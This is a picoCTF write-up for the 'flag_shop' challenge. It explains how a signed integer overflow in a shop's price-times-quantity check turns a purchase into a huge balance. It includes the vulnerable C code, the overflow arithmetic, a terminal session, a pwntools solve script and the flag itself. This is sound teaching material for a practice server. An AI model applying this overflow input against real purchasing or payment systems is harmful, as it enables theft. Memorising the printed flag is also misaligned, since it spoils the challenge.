# Flag Shop — picoCTF Writeup

**Challenge:** flag_shop  
**Category:** General Skills  
**Difficulty:** Medium  
**Points:** 300  
**Flag:** `picoCTF{m0n3y_bag5_F2Eb382F}`  
**Platform:** picoCTF 2026  
**Writeup by:** zham

---

## Description

> There's a flag shop selling stuff, can you buy a flag?
> Connect with `nc fickle-tempest.picoctf.net 57646`

## Hints

> Two's compliment can do some weird things when numbers get really big!

---

## Background Knowledge (Read This First!)

A few things to understand before touching the terminal.

**Integers have a limit.** A normal C `int` is 32 bits. That means it can only hold values from about `-2,147,483,648` to `2,147,483,647`. Once a calculation tries to go past that ceiling, it doesn't error out — it wraps around and keeps going, like a car odometer rolling over from 999999 back to 000000.

**Two's complement is how negative numbers are stored.** Computers don't have a special "minus" symbol sitting in memory. Instead, the very top bit of the number is used as a sign flag. If that top bit flips to 1 because a value got too big, the CPU reads the whole number as negative — even though, mathematically, you were only ever adding positive numbers together.

**Why this matters here:** the shop multiplies `price * quantity` and stores the result in a plain `int`, with zero upper bound checking. If I ask to buy a huge quantity, the multiplication overflows past 2,147,483,647 and wraps into negative territory. The program then treats my "total cost" as a negative number, which breaks every assumption the code makes about money only ever going down.

---

## Source Review

The relevant snippet from `store.c`:

```c
int account_balance = 1100;
...
scanf("%d", &number_flags);
if(number_flags > 0){
    int total_cost = 0;
    total_cost = 900*number_flags;
    printf("\nThe final cost is: %d\n", total_cost);
    if(total_cost <= account_balance){
        account_balance = account_balance - total_cost;
        printf("\nYour current balance after transaction: %d\n\n", account_balance);
    }
    ...
}
```

There's no upper limit on `number_flags`, and `total_cost` is a signed `int`. If `900 * number_flags` exceeds `2,147,483,647`, it wraps into a negative number. The check `total_cost <= account_balance` then passes (because any negative number is "less than" 1100), and the next line does:

```
account_balance = account_balance - total_cost
```

Subtracting a negative number is the same as adding its absolute value — so my balance shoots up instead of down.

Later in the code, the 1337 flag costs `100000` and requires `account_balance > 100000`:

```c
if(account_balance > 100000){
    FILE *f = fopen("flag.txt", "r");
    ...
    printf("YOUR FLAG IS: %s\n", buf);
}
```

So the plan is: overflow my balance into the billions, then walk up and buy the real flag.

---

## Solution

### Step 1 — Connect to the server

```
┌──(zham㉿kali)-[~]
└─$ nc fickle-tempest.picoctf.net 57646
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
```

### Step 2 — Pick the right quantity to overflow

I need `900 * number_flags` to land just past `2^31` so it wraps negative with a large magnitude. I did the math in Python first to pick a clean number:

```
┌──(zham㉿kali)-[~]
└─$ python3
>>> n = 3000000
>>> cost = 900 * n
>>> cost
2700000000
>>> m = cost % (2**32)
>>> if m >= 2**31:
...     m -= 2**32
... 
>>> m
-1594967296
>>> 1100 - m
1594968396
```

`3,000,000` flags at `900` each comes out to `2,700,000,000`. That's bigger than the signed 32-bit ceiling (`2,147,483,647`), so it wraps to `-1,594,967,296`. My balance check then does `1100 - (-1,594,967,296)`, which lands me at `1,594,968,396` — comfortably over the `100,000` needed for the real flag.

### Step 3 — Trigger the overflow on the server

```
2

Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1

These knockoff Flags cost 900 each, enter desired quantity
3000000

The final cost is: -1594967296

Your current balance after transaction: 1594968396

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
```

### Step 4 — Buy the real flag

```
2

Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2

1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one
1

YOUR FLAG IS: picoCTF{m0n3y_bag5_F2Eb382F}
```

Flag obtained.

### Alternative method — script it instead of typing by hand

Since the connection is interactive, I can also automate the whole exchange with `pwntools` so I don't have to type the menu choices manually each time:

```
┌──(zham㉿kali)-[~]
└─$ nano solve.py
```

Paste the following:

```python
from pwn import *

r = remote("fickle-tempest.picoctf.net", 57646)

r.sendlineafter(b"selection", b"2")     # Buy Flags
r.sendlineafter(b"1337 Flag", b"1")     # knockoff flag
r.sendlineafter(b"quantity", b"3000000")  # trigger overflow

r.sendlineafter(b"selection", b"2")     # Buy Flags again
r.sendlineafter(b"1337 Flag", b"2")     # the real 1337 flag
r.sendlineafter(b"buy one", b"1")       # confirm bid

print(r.recvall().decode())
```

Save and run:

```
Ctrl+O, Enter, Ctrl+X
```

```
┌──(zham㉿kali)-[~]
└─$ python3 solve.py
[+] Opening connection to fickle-tempest.picoctf.net on port 57646: Done
YOUR FLAG IS: picoCTF{m0n3y_bag5_F2Eb382F}
[*] Closed connection to fickle-tempest.picoctf.net port 57646
```

Same result, no manual typing.

---

## What Happened Internally

1. Program starts with `account_balance = 1100` (a 32-bit signed `int`).
2. I select "Buy Flags" → "knockoff flag" and enter `3000000` as quantity.
3. The program computes `900 * 3000000 = 2,700,000,000`.
4. `2,700,000,000` is larger than the max value an `int` can hold (`2,147,483,647`), so the CPU wraps it around using two's complement, storing it as `-1,594,967,296`.
5. The check `total_cost <= account_balance` sees `-1,594,967,296 <= 1100`, which is true, so the purchase is "allowed."
6. `account_balance = 1100 - (-1,594,967,296)` evaluates to `1,594,968,396` — my balance just exploded upward from a "purchase."
7. I go back to the menu, select the 1337 Flag, and the server checks `account_balance > 100000`. It is, by a wide margin, so it opens `flag.txt` and prints it back to me.

---

## Tools Used

| Tool | Purpose |
|---|---|
| `nc` | Connect to the remote challenge server |
| Python 3 (interactive shell) | Work out the overflow math before sending input |
| `pwntools` | Automate the interactive exchange (alternative method) |
| `nano` | Write the solve script |

---

## Key Takeaways

- Never trust a number just because the program "checks" it — if the check itself relies on an unbounded arithmetic operation, the check can be defeated by the arithmetic.
- Signed integer overflow in C is undefined behavior in the strict sense, but in practice on most systems it wraps around using two's complement, turning "too big" into "very negative."
- A single missing upper bound on user input (`number_flags`) was enough to flip a deny-by-default purchase check into an instant credit boost.
- Flag wordplay: `m0n3y_bag5` is exactly what the exploit hands you — the overflow doesn't just bypass the price check, it dumps "money bags" straight into the account balance. A single bad subtraction turned a purchase into a windfall.
